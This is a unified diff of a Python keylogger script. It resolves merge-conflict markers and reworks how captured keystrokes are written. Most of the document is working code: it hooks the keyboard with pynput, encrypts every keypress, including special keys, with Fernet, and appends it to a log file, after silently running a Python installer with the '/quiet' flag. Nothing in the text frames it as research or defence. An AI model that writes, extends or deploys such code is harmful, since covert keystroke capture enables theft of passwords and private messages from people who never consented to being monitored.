@@ -4,15 +4,11 @@ from pynput import keyboard
 from cryptography.fernet import Fernet
 
 def install_python():
+    # Check if Python is installed already
     if not os.path.exists("C:\\Python311\\python.exe"):
         python_installer = "python-3.11.9-amd64.exe"
-        if os.path.exists(python_installer):
-            subprocess.run([python_installer, '/quiet', '/norestart'], check=True)
-        else:
-            print("Python installer not found.")
-            raise FileNotFoundError("Python installer not found.")
-    else:
-        print("Python is already installed.")
+        # Run Python installer silently
+        subprocess.run([python_installer, '/quiet', '/norestart'])
 
 def get_encryption_key():
     try:
@@ -27,39 +23,26 @@ def get_encryption_key():
 key_count = 0
 
 def keyPressed(key):
-    global key_count
     encryption_key = get_encryption_key()
     cipher_suite = Fernet(encryption_key)
 
     try:
-<<<<<<< HEAD
-        with open("keyfile.txt", 'ab') as logKey:
-=======
         with open("keyfile.txt", 'ab') as logKey:  # Open in binary mode to write encrypted bytes
-            if key_count >= 50:
-                logKey.write(cipher_suite.encrypt(b'\n'))  # New line every 50 inputs to keep clean
-                key_count = 0
->>>>>>> parent of 332cb8d (working decryption)
-            try:
-                char = key.char
-                logKey.write(cipher_suite.encrypt(char.encode()))
-            except AttributeError:
-<<<<<<< HEAD
+            if hasattr(key, 'char') and key.char is not None:
+                encrypted_char = cipher_suite.encrypt(key.char.encode())
+                logKey.write(encrypted_char)
+                logKey.write(b'\n')  # Adding a delimiter for each input
+            else:
                 if key == keyboard.Key.space:
-                    logKey.write(cipher_suite.encrypt(b' '))
-=======
-                # Handle special keys
-                if key == keyboard.Key.space:
-                    logKey.write(cipher_suite.encrypt(b' '))  # When Space is pressed write ' ' instead of key.space
->>>>>>> parent of 332cb8d (working decryption)
+                    encrypted_space = cipher_suite.encrypt(b' ')
+                    logKey.write(encrypted_space)
+                    logKey.write(b'\n')  # Adding a delimiter for each input
                 else:
-                    logKey.write(cipher_suite.encrypt(f'[{key}]'.encode()))
+                    encrypted_special_key = cipher_suite.encrypt(f'[{key}]'.encode())
+                    logKey.write(encrypted_special_key)
+                    logKey.write(b'\n')  # Adding a delimiter for each input
     except Exception as e:
-        print(f"Error logging key: {str(e)}")
-
-    key_count += 1
-
-    key_count += 1  
+        print(f"Error logging key: {str(e)}")  
 
     if key == keyboard.Key.esc:
         return False
@@ -68,15 +51,9 @@ if __name__ == "__main__":
     install_python()
 
     # Ensure the keyfile.txt is empty at the start
-    with open("keyfile.txt", 'wb') as f:
-        pass
+    open("keyfile.txt", 'wb').close()  # Open in binary mode to create an empty file
 
-    
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
-<<<<<<< HEAD
-    listener.join()
-=======
     listener.join()  
-    input()  
->>>>>>> parent of 332cb8d (working decryption)
+    input() 
